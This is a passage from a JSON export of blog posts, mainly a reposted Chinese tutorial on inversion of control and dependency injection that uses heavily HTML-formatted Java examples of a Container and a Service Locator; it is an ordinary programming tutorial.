color:rgb(0,102,153)\"><strong>&gt;</strong></span>pinyin4j<span style=\"padding:0px; margin:0px; color:rgb(0,102,153)\"><strong>&lt;/</strong></span><span style=\"padding:0px; margin:0px; color:rgb(0,102,153)\"><strong>artifactId</strong></span><span style=\"padding:0px; margin:0px; color:rgb(0,102,153)\"><strong>&gt;</strong></span>&nbsp;&nbsp;</span></span></li><li style=\"padding:0px; margin:0px\"><span style=\"padding:0px; margin:0px\"><span style=\"padding:0px; margin:0px; color:black\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style=\"padding:0px; margin:0px; color:rgb(0,102,153)\"><strong>&lt;</strong></span><span style=\"padding:0px; margin:0px; color:rgb(0,102,153)\"><strong>version</strong></span><span style=\"padding:0px; margin:0px; color:rgb(0,102,153)\"><strong>&gt;</strong></span>2.5.0<span style=\"padding:0px; margin:0px; color:rgb(0,102,153)\"><strong>&lt;/</strong></span><span style=\"padding:0px; margin:0px; color:rgb(0,102,153)\"><strong>version</strong></span><span style=\"padding:0px; margin:0px; color:rgb(0,102,153)\"><strong>&gt;</strong></span>&nbsp;&nbsp;</span></span></li><li style=\"padding:0px; margin:0px\"><span style=\"padding:0px; margin:0px\"><span style=\"padding:0px; margin:0px; color:black\"><span style=\"padding:0px; margin:0px; color:rgb(0,102,153)\"><strong>&lt;/</strong></span><span style=\"padding:0px; margin:0px; color:rgb(0,102,153)\"><strong>dependency</strong></span><span style=\"padding:0px; margin:0px; color:rgb(0,102,153)\"><strong>&gt;</strong></span>&nbsp;&nbsp;</span></span></li><li></li></ol>\r\n",
			"tags":"maven",
			"id":"50187187",
			"categories":"maven,java",
			"status":1
		},
		"error":"",
		"status":true
	},
	{
		"data":{
			"date":"2015年11月03日 15:49:55",
			"articleedittype":1,
			"private":0,
			"channel":"16",
			"description":"原创作品，允许转载，转载时请务必以超链接形式标明文章 原始出处 、作者信息和本声明。否则将追究法律责任。http://haolloyin.blog.51cto.com/1177454/460631\r\n\r\n\r\n 接上一篇“演进式例解控制反转（IoC）、依赖注入（DI）之一”的例子继续往下。\r\n \r\n回顾：\r\n\r\n上一篇文章演进式的问题描述、解决方法只有 3 个阶段，其中后面 2 个分别是引入了 Co",
			"title":"演进式例解控制反转（IoC）、依赖注入（DI）之二",
			"type":"repost",
			"content":"\r\n<div class=\"CopyrightStatement lh22\" style=\"padding:10px; margin:0px 12px; border:1px dashed rgb(213,213,213); line-height:22px; color:rgb(85,85,85); font-family:宋体,'Arial Narrow',arial,serif\">\r\n原创作品，允许转载，转载时请务必以超链接形式标明文章&nbsp;<a target=\"_blank\" href=\"http://haolloyin.blog.51cto.com/1177454/460631\" target=\"_blank\" style=\"padding:0px; margin:0px; color:rgb(92,101,13)\">原始出处</a>&nbsp;、作者信息和本声明。否则将追究法律责任。<a target=\"_blank\" href=\"http://haolloyin.blog.51cto.com/1177454/460631\" style=\"padding:0px; margin:0px; color:rgb(92,101,13); text-decoration:none\">http://haolloyin.blog.51cto.com/1177454/460631</a></div>\r\n<div class=\"showContent\" style=\"padding:0px; margin:20px 15px 8px; line-height:2; font-size:14px; border-bottom-width:1px; border-bottom-style:dashed; border-bottom-color:rgb(217,217,217); word-wrap:break-word; word-break:normal; color:rgb(85,85,85); font-family:宋体,'Arial Narrow',arial,serif\">\r\n<p style=\"padding-top:0px; padding-bottom:0px; margin-top:0px; margin-bottom:0px; clear:both; height:auto; overflow:hidden\">\r\n&nbsp;<span style=\"padding:0px; margin:0px; font-size:12pt; font-family:宋体\">接上一篇“</span><span style=\"padding:0px; margin:0px\"><span style=\"padding:0px; margin:0px; font-family:Arial; color:rgb(51,51,51)\"><a target=\"_blank\" target=\"_blank\" href=\"http://haolloyin.blog.51cto.com/1177454/458416\" style=\"padding:0px; margin:0px; color:rgb(92,101,13); text-decoration:none\"><span style=\"padding:0px; margin:0px; font-family:宋体; color:rgb(0,95,171)\">演进式例解控制反转（</span><span style=\"padding:0px; margin:0px; color:rgb(0,95,171)\">IoC</span><span style=\"padding:0px; margin:0px; font-family:宋体; color:rgb(0,95,171)\">）、依赖注入（</span><span style=\"padding:0px; margin:0px; color:rgb(0,95,171)\">DI</span><span style=\"padding:0px; margin:0px; font-family:宋体; color:rgb(0,95,171)\">）之一</span></a></span></span><span style=\"padding:0px; margin:0px; font-size:12pt; font-family:宋体\">”的例子继续往下。</span></p>\r\n<div style=\"padding:0px; margin:0px\">&nbsp;</div>\r\n<div style=\"padding:0px; margin:0px\"><span style=\"padding:0px; margin:0px\"><span style=\"padding:0px; margin:0px; font-size:12pt; font-family:宋体\">回顾：</span></span></div>\r\n<p style=\"padding-top:0px; padding-bottom:0px; margin-top:0px; margin-bottom:0px; clear:both; height:auto; overflow:hidden\">\r\n<span style=\"padding:0px; margin:0px; font-size:12pt; font-family:宋体\">上一篇文章演进式的问题描述、解决方法只有</span><span style=\"padding:0px; margin:0px; font-size:12pt\">&nbsp;3&nbsp;</span><span style=\"padding:0px; margin:0px; font-size:12pt; font-family:宋体\">个阶段，其中后面</span><span style=\"padding:0px; margin:0px; font-size:12pt\">&nbsp;2&nbsp;</span><span style=\"padding:0px; margin:0px; font-size:12pt; font-family:宋体\">个分别是引入了</span><span style=\"padding:0px; margin:0px; font-size:12pt\">&nbsp;Container</span><span style=\"padding:0px; margin:0px; font-size:12pt; font-family:宋体\">、</span><span style=\"padding:0px; margin:0px; font-size:12pt\">Service\r\n Locator&nbsp;</span><span style=\"padding:0px; margin:0px; font-size:12pt; font-family:宋体\">这样一种<span style=\"padding:0px; margin:0px; background:yellow\">间接层</span>，以便解决各个‘问题描述’中<span style=\"padding:0px; margin:0px; background:yellow\">可能的</span>不足之处（仅仅是‘<span style=\"padding:0px; margin:0px\">可能</span>’，或许系统不需要考虑这么麻烦的需求，是否因为引入间接层而增大系统不必要的复杂度得由具体需求所决定），也就是希望消除（或者说<span style=\"padding:0px; margin:0px\">转移、减弱</span>）一些直接依赖、紧耦合。</span>&nbsp;</p>\r\n<p style=\"padding-top:0px; padding-bottom:0px; margin-top:0px; margin-bottom:0px; clear:both; height:auto; overflow:hidden\">\r\n<span style=\"padding:0px; margin:0px; font-size:12pt; font-family:宋体\">实际上一篇还未能引入</span><span style=\"padding:0px; margin:0px; font-size:12pt\">&nbsp;IoC&nbsp;</span><span style=\"padding:0px; margin:0px; font-size:12pt; font-family:宋体\">、</span><span style=\"padding:0px; margin:0px; font-size:12pt\">DI</span><span style=\"padding:0px; margin:0px; font-size:12pt; font-family:宋体\">，以其做铺垫热身之后的这篇才是重点要理解的。</span></p>\r\n<div style=\"padding:0px; margin:0px\">&nbsp;</div>\r\n<div style=\"padding:0px; margin:0px\">&nbsp;</div>\r\n<div style=\"padding:0px; margin:0px\"><span style=\"padding:0px; margin:0px\"><span style=\"padding:0px; margin:0px; font-size:12pt; font-family:宋体\">问题描述：</span></span></div>\r\n<p style=\"padding-top:0px; padding-bottom:0px; margin-top:0px; margin-bottom:0px; clear:both; height:auto; overflow:hidden\">\r\n<span style=\"padding:0px; margin:0px; font-size:12pt; font-family:宋体\">然而，不管是引入</span><span style=\"padding:0px; margin:0px; font-size:12pt\">&nbsp;Container&nbsp;</span><span style=\"padding:0px; margin:0px; font-size:12pt; font-family:宋体\">还是使用</span><span style=\"padding:0px; margin:0px; font-size:12pt\">&nbsp;Service\r\n Locator&nbsp;</span><span style=\"padding:0px; margin:0px; font-size:12pt; font-family:宋体\">，</span><span style=\"padding:0px; margin:0px; font-size:12pt\">ReportService&nbsp;</span><span style=\"padding:0px; margin:0px; font-size:12pt; font-family:宋体\">对于具体组件的查找、创建的方式都是‘<span style=\"padding:0px; margin:0px\"><span style=\"padding:0px; margin:0px; background:yellow\">主动</span></span>’的，这意味着作为客户的</span><span style=\"padding:0px; margin:0px; font-size:12pt\">&nbsp;ReportService&nbsp;</span><span style=\"padding:0px; margin:0px; font-size:12pt; font-family:宋体\">必须清楚自己需要的是什么、到哪里获取、如何获取。一下子就因为</span><span style=\"padding:0px; margin:0px; font-size:12pt\">&nbsp;What</span><span style=\"padding:0px; margin:0px; font-size:12pt; font-family:宋体\">、</span><span style=\"padding:0px; margin:0px; font-size:12pt\">Where</span><span style=\"padding:0px; margin:0px; font-size:12pt; font-family:宋体\">、</span><span style=\"padding:0px; margin:0px; font-size:12pt\">How&nbsp;</span><span style=\"padding:0px; margin:0px; font-size:12pt; font-family:宋体\">而不得不增加了具体逻辑细节。</span>&nbsp;</p>\r\n<p style=\"padding-top:0px; padding-bottom:0px; margin-top:0px; margin-bottom:0px; clear:both; height:auto; overflow:hidden\">\r\n&nbsp;</p>\r\n<p style=\"padding-top:0px; padding-bottom:0px; margin-top:0px; margin-bottom:0px; clear:both; height:auto; overflow:hidden\">\r\n<span style=\"padding:0px; margin:0px; font-size:12pt; font-family:宋体\">例如，在前面‘引入</span><span style=\"padding:0px; margin:0px; font-size:12pt\">Container&nbsp;</span><span style=\"padding:0px; margin:0px; font-size:12pt; font-family:宋体\">’的实现方法中，有如下代码：</span>&nbsp;</p>\r\n<p align=\"left\" style=\"padding-top:0px; padding-bottom:0px; margin-top:0px; margin-bottom:0px; clear:both; height:auto; overflow:hidden\">\r\n<span style=\"padding:0px; margin:0px\"><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:rgb(127,0,85)\">class</span></span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:black\">&nbsp;ReportService\r\n {</span></p>\r\n<p align=\"left\" style=\"padding-top:0px; padding-bottom:0px; margin-top:0px; margin-bottom:0px; clear:both; height:auto; overflow:hidden\">\r\n<span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:black\">&nbsp;&nbsp;&nbsp;&nbsp;</span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:rgb(63,127,95)\">//&nbsp;</span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:宋体\">消除紧耦合关系，由容器取而代之</span></p>\r\n<p align=\"left\" style=\"padding-top:0px; padding-bottom:0px; margin-top:0px; margin-bottom:0px; clear:both; height:auto; overflow:hidden\">\r\n<span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:black\">&nbsp;&nbsp;&nbsp;&nbsp;</span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:rgb(63,127,95)\">//&nbsp;<span style=\"padding:0px; margin:0px\">private&nbsp;static</span>&nbsp;ReportGenerator&nbsp;<span style=\"padding:0px; margin:0px\">generator</span>&nbsp;=&nbsp;<span style=\"padding:0px; margin:0px\">new</span>&nbsp;PDFGenerator();</span></p>\r\n<p align=\"left\" style=\"padding-top:0px; padding-bottom:0px; margin-top:0px; margin-bottom:0px; clear:both; height:auto; overflow:hidden\">\r\n<span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:black\">&nbsp;&nbsp;&nbsp;&nbsp;</span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:rgb(63,127,95)\">//&nbsp;</span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:宋体\">通过</span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:rgb(63,127,95)\">&nbsp;<span style=\"padding:0px; margin:0px\">Container</span><span style=\"padding:0px; margin:0px\">..getBean(&quot;reportGenerator&quot;)&nbsp;<span style=\"padding:0px; margin:0px\"><span style=\"padding:0px; margin:0px; background:yellow\">‘</span></span></span></span><span style=\"padding:0px; margin:0px\"><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:宋体; background:yellow\">主动</span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:rgb(63,127,95); background:yellow\">’</span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:宋体; background:yellow\">查找</span></span></p>\r\n<p align=\"left\" style=\"padding-top:0px; padding-bottom:0px; margin-top:0px; margin-bottom:0px; clear:both; height:auto; overflow:hidden\">\r\n<span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:black\">&nbsp;&nbsp;&nbsp;&nbsp;</span><span style=\"padding:0px; margin:0px\"><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:rgb(127,0,85)\">private</span></span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:black\">&nbsp;ReportGenerator&nbsp;</span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:rgb(0,0,192)\">generator</span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:black\">&nbsp;=\r\n (ReportGenerator) Container</span></p>\r\n<p style=\"padding-top:0px; padding-bottom:0px; margin-top:0px; margin-bottom:0px; clear:both; height:auto; overflow:hidden\">\r\n<span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:black\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; .<span style=\"padding:0px; margin:0px\">getBean</span>(</span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:rgb(42,0,255)\">&quot;reportGenerator&quot;</span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:black\">);</span></p>\r\n<div style=\"padding:0px; margin:0px\">&nbsp;</div>\r\n<p align=\"left\" style=\"padding-top:0px; padding-bottom:0px; margin-top:0px; margin-bottom:0px; clear:both; height:auto; overflow:hidden\">\r\n<span style=\"padding:0px; margin:0px; font-size:12pt; font-family:宋体\">在‘引入</span><span style=\"padding:0px; margin:0px; font-size:12pt\">&nbsp;Service Locator&nbsp;</span><span style=\"padding:0px; margin:0px; font-size:12pt; font-family:宋体\">’</span><span style=\"padding:0px; margin:0px; font-size:12pt; font-family:宋体\">的实现方法中，有如下代码：</span>&nbsp;</p>\r\n<p align=\"left\" style=\"padding-top:0px; padding-bottom:0px; margin-top:0px; margin-bottom:0px; clear:both; height:auto; overflow:hidden\">\r\n<span style=\"padding:0px; margin:0px\"><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:rgb(127,0,85)\">class</span></span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:black\">&nbsp;ServiceLocator\r\n {</span></p>\r\n<p align=\"left\" style=\"padding-top:0px; padding-bottom:0px; margin-top:0px; margin-bottom:0px; clear:both; height:auto; overflow:hidden\">\r\n<span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:black\">&nbsp;&nbsp;&nbsp;&nbsp;</span><span style=\"padding:0px; margin:0px\"><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:rgb(127,0,85)\">private</span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:rgb(127,0,85)\">static</span></span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:black\">&nbsp;<span style=\"padding:0px; margin:0px\">Container</span>&nbsp;</span><span style=\"padding:0px; margin:0px\"><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:rgb(0,0,192)\">container</span></span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:black\">&nbsp;=&nbsp;</span><span style=\"padding:0px; margin:0px\"><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:rgb(127,0,85)\">new</span></span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:black\">&nbsp;<span style=\"padding:0px; margin:0px\">Container</span>();</span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:black\">&nbsp;&nbsp;&nbsp;</span></p>\r\n<p align=\"left\" style=\"padding-top:0px; padding-bottom:0px; margin-top:0px; margin-bottom:0px; clear:both; height:auto; overflow:hidden\">\r\n<span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:black\">&nbsp;&nbsp;&nbsp;&nbsp;</span><span style=\"padding:0px; margin:0px\"><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:rgb(127,0,85)\">public</span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:rgb(127,0,85)\">static</span></span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:black\">&nbsp;<span style=\"padding:0px; margin:0px\">ReportGenerator</span>&nbsp;getReportGenerator()\r\n {</span></p>\r\n<p align=\"left\" style=\"padding-top:0px; padding-bottom:0px; margin-top:0px; margin-bottom:0px; clear:both; height:auto; overflow:hidden\">\r\n<span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:black\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:rgb(63,127,95)\">//&nbsp;</span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:宋体\">还是</span><span style=\"padding:0px; margin:0px\"><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:rgb(0,0,192)\">container</span></span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:black\">.getBean(),&nbsp;</span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:宋体\">用了委托而已</span></p>\r\n<p align=\"left\" style=\"padding-top:0px; padding-bottom:0px; margin-top:0px; margin-bottom:0px; clear:both; height:auto; overflow:hidden\">\r\n<span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:black\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style=\"padding:0px; margin:0px\"><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:rgb(127,0,85)\">return</span></span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:black\">&nbsp;<span style=\"padding:0px; margin:0px\">(ReportGenerator)</span></span><span style=\"padding:0px; margin:0px\"><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:rgb(0,0,192)\">&nbsp;container</span></span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:black\">.getBean(</span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:rgb(42,0,255)\">&quot;reportGeneraator&quot;</span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:black\">);</span></p>\r\n<p align=\"left\" style=\"padding-top:0px; padding-bottom:0px; margin-top:0px; margin-bottom:0px; clear:both; height:auto; overflow:hidden\">\r\n<span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:black\">&nbsp;&nbsp;&nbsp; }</span></p>\r\n<p align=\"left\" style=\"padding-top:0px; padding-bottom:0px; margin-top:0px; margin-bottom:0px; clear:both; height:auto; overflow:hidden\">\r\n<span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:black\">}</span>&nbsp;</p>\r\n<p align=\"left\" style=\"padding-top:0px; padding-bottom:0px; margin-top:0px; margin-bottom:0px; clear:both; height:auto; overflow:hidden\">\r\n<span style=\"padding:0px; margin:0px\"><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:rgb(127,0,85)\">class</span></span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:black\">&nbsp;ReportService\r\n {</span></p>\r\n<p align=\"left\" style=\"padding-top:0px; padding-bottom:0px; margin-top:0px; margin-bottom:0px; clear:both; height:auto; overflow:hidden\">\r\n<span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:black\">&nbsp;&nbsp;&nbsp;&nbsp;</span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:rgb(63,127,95)\">// ReportService&nbsp;</span><span style=\"padding:0px; margin:0px\"><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:宋体\">最终还是</span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:rgb(63,127,95); background:yellow\">‘</span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:宋体\">主动</span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:rgb(63,127,95); background:yellow\">’</span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:宋体\">查找</span></span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:宋体\">，委托给</span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:black\">ServiceLocator&nbsp;</span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:宋体\">而已</span></p>\r\n<p align=\"left\" style=\"padding-top:0px; padding-bottom:0px; margin-top:0px; margin-bottom:0px; clear:both; height:auto; overflow:hidden\">\r\n<span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:black\">&nbsp;&nbsp;&nbsp;&nbsp;</span><span style=\"padding:0px; margin:0px\"><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:rgb(127,0,85)\">private</span></span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:black\">&nbsp;<span style=\"padding:0px; margin:0px\">ReportGenerator</span>&nbsp;</span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:rgb(0,0,192)\">reportGenerator</span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:black\">&nbsp;=\r\n ServiceLocator.<span style=\"padding:0px; margin:0px\"><span style=\"padding:0px; margin:0px\">getReportGenerator</span></span>();&nbsp;&nbsp;</span></p>\r\n<p style=\"padding-top:0px; padding-bottom:0px; margin-top:0px; margin-bottom:0px; clear:both; height:auto; overflow:hidden\">\r\n<span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:black\">}</span></p>\r\n<div style=\"padding:0px; margin:0px\">&nbsp;</div>\r\n<div style=\"padding:0px; margin:0px\"><span style=\"padding:0px; margin:0px\"><span style=\"padding:0px; margin:0px; font-size:12pt; font-family:宋体\">解决方案：</span></span></div>\r\n<p style=\"padding-top:0px; padding-bottom:0px; margin-top:0px; margin-bottom:0px; clear:both; height:auto; overflow:hidden\">\r\n<span style=\"padding:0px; margin:0px; font-size:12pt; font-family:宋体\">在这种情况下，变‘主动’为‘被动’无疑能够减少</span><span style=\"padding:0px; margin:0px; font-size:12pt\">&nbsp;ReportService&nbsp;</span><span style=\"padding:0px; margin:0px; font-size:12pt; font-family:宋体\">的内部知识（即查找组件的逻辑）。根据控制反转（</span><span style=\"padding:0px; margin:0px; font-size:12pt\">IoC</span><span style=\"padding:0px; margin:0px; font-size:12pt; font-family:宋体\">）原则，可江此种<span style=\"padding:0px; margin:0px\">拉</span>（</span><span style=\"padding:0px; margin:0px\"><span style=\"padding:0px; margin:0px; font-size:12pt\">Pull</span></span><span style=\"padding:0px; margin:0px; font-size:12pt; font-family:宋体\">，主动的）转化成<span style=\"padding:0px; margin:0px\">推</span>（</span><span style=\"padding:0px; margin:0px\"><span style=\"padding:0px; margin:0px; font-size:12pt\">Push</span></span><span style=\"padding:0px; margin:0px; font-size:12pt; font-family:宋体\">，被动的）的模式。</span></p>\r\n<div style=\"padding:0px; margin:0px\">&nbsp;</div>\r\n<p style=\"padding-top:0px; padding-bottom:0px; margin-top:0px; margin-bottom:0px; clear:both; height:auto; overflow:hidden\">\r\n<span style=\"padding:0px; margin:0px; font-size:12pt; font-family:宋体\">例如，平时使用的</span><span style=\"padding:0px; margin:0px; font-size:12pt\">&nbsp;RSS&nbsp;</span><span style=\"padding:0px; margin:0px; font-size:12pt; font-family:宋体\">订阅就是</span><span style=\"padding:0px; margin:0px; font-size:12pt\">Push</span><span style=\"padding:0px; margin:0px; font-size:12pt; font-family:宋体\">的应用，省去了我们一天好几次登录自己喜爱的站点主动获取文章更新的麻烦。</span></p>\r\n<div style=\"padding:0px; margin:0px\">&nbsp;</div>\r\n<p style=\"padding-top:0px; padding-bottom:0px; margin-top:0px; margin-bottom:0px; clear:both; height:auto; overflow:hidden\">\r\n<span style=\"padding:0px; margin:0px; font-size:12pt; font-family:宋体\">而依赖注入（</span><span style=\"padding:0px; margin:0px; font-size:12pt\">DI</span><span style=\"padding:0px; margin:0px; font-size:12pt; font-family:宋体\">）则是实现这种被动接收、减少客户（在这里即</span><span style=\"padding:0px; margin:0px; font-size:12pt\">ReportService</span><span style=\"padding:0px; margin:0px; font-size:12pt; font-family:宋体\">）自身包含复杂逻辑、知晓过多的弊病。</span></p>\r\n<div style=\"padding:0px; margin:0px\">&nbsp;</div>\r\n<div style=\"padding:0px; margin:0px\"><span style=\"padding:0px; margin:0px\"><span style=\"padding:0px; margin:0px; font-size:12pt; font-family:宋体\">实现方法：</span></span></div>\r\n<p style=\"padding-top:0px; padding-bottom:0px; margin-top:0px; margin-bottom:0px; clear:both; height:auto; overflow:hidden\">\r\n<span style=\"padding:0px; margin:0px; font-size:12pt; font-family:宋体\">因为我们希望是‘被动’的接收，故还是回到</span><span style=\"padding:0px; margin:0px; font-size:12pt\">&nbsp;Container&nbsp;</span><span style=\"padding:0px; margin:0px; font-size:12pt; font-family:宋体\">的例子，而不使用</span><span style=\"padding:0px; margin:0px; font-size:12pt\">&nbsp;Service\r\n Locator&nbsp;</span><span style=\"padding:0px; margin:0px; font-size:12pt; font-family:宋体\">模式。由此得到修改后的类图如下：</span></p>\r\n<p style=\"padding-top:0px; padding-bottom:0px; margin-top:0px; margin-bottom:0px; clear:both; height:auto; overflow:hidden\">\r\n<span style=\"padding:0px; margin:0px; font-size:12pt\"></span></p>\r\n<p style=\"padding-top:0px; padding-bottom:0px; margin-top:0px; margin-bottom:0px; clear:both; height:auto; overflow:hidden\">\r\n<a target=\"_blank\" href=\"http://img1.51cto.com/attachment/201012/205737655.jpg\" target=\"_blank\" style=\"padding:0px; margin:0px; color:rgb(92,101,13); text-decoration:none\"><img src=\"http://img1.51cto.com/attachment/201012/205737655.jpg\" border=\"0\" alt=\"\" style=\"padding:0px; margin:0px; vertical-align:top; border:none\"></a></p>\r\n<div style=\"padding:0px; margin:0px\">&nbsp;</div>\r\n<div style=\"padding:0px; margin:0px\"><span style=\"padding:0px; margin:0px; font-size:12pt; font-family:宋体\">而原来的类图如下，可以对照着看一下，注意注释的提示：</span></div>\r\n<p style=\"padding-top:0px; padding-bottom:0px; margin-top:0px; margin-bottom:0px; clear:both; height:auto; overflow:hidden\">\r\n<span style=\"padding:0px; margin:0px; font-size:12pt\"></span></p>\r\n<p style=\"padding-top:0px; padding-bottom:0px; margin-top:0px; margin-bottom:0px; clear:both; height:auto; overflow:hidden\">\r\n<a target=\"_blank\" href=\"http://img1.51cto.com/attachment/201012/205748383.jpg\" target=\"_blank\" style=\"padding:0px; margin:0px; color:rgb(92,101,13); text-decoration:none\"><img src=\"http://img1.51cto.com/attachment/201012/205748383.jpg\" border=\"0\" alt=\"\" style=\"padding:0px; margin:0px; vertical-align:top; border:none\"></a></p>\r\n<div style=\"padding:0px; margin:0px\">&nbsp;</div>\r\n<div style=\"padding:0px; margin:0px\"><span style=\"padding:0px; margin:0px; font-size:12pt; font-family:宋体\">代码实现：</span></div>\r\n<div align=\"left\" style=\"padding:0px; margin:0px\"><span style=\"padding:0px; margin:0px; font-size:12pt; font-family:宋体\">为了使例子能够编译、运行，并且稍微利用跟踪代码的运行结果来显式整个类图实例化、互相协作的先后顺序，在各个类的构造器中加入了不少<span style=\"padding:0px; margin:0px\">已编号</span>的打印语句，以及两个无关紧要的类，有点啰唆，具体如下：</span>&nbsp;</div>\r\n<p align=\"left\" style=\"padding-top:0px; padding-bottom:0px; margin-top:0px; margin-bottom:0px; clear:both; height:auto; overflow:hidden\">\r\n<span style=\"padding:0px; margin:0px\"><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:rgb(127,0,85)\">import</span></span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:black\">&nbsp;java.util.Date;</span></p>\r\n<p align=\"left\" style=\"padding-top:0px; padding-bottom:0px; margin-top:0px; margin-bottom:0px; clear:both; height:auto; overflow:hidden\">\r\n<span style=\"padding:0px; margin:0px\"><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:rgb(127,0,85)\">import</span></span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:black\">&nbsp;java.util.HashMap;</span></p>\r\n<p align=\"left\" style=\"padding-top:0px; padding-bottom:0px; margin-top:0px; margin-bottom:0px; clear:both; height:auto; overflow:hidden\">\r\n<span style=\"padding:0px; margin:0px\"><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:rgb(127,0,85)\">import</span></span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:black\">&nbsp;java.util.Map;</span>&nbsp;</p>\r\n<p align=\"left\" style=\"padding-top:0px; padding-bottom:0px; margin-top:0px; margin-bottom:0px; clear:both; height:auto; overflow:hidden\">\r\n<span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:rgb(63,127,95)\">//&nbsp;</span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:宋体\">为了能够编译运行，多了两个无关紧要的类</span></p>\r\n<p align=\"left\" style=\"padding-top:0px; padding-bottom:0px; margin-top:0px; margin-bottom:0px; clear:both; height:auto; overflow:hidden\">\r\n<span style=\"padding:0px; margin:0px\"><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:rgb(127,0,85)\">class</span></span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:black\">&nbsp;Month\r\n { }</span></p>\r\n<p align=\"left\" style=\"padding-top:0px; padding-bottom:0px; margin-top:0px; margin-bottom:0px; clear:both; height:auto; overflow:hidden\">\r\n<span style=\"padding:0px; 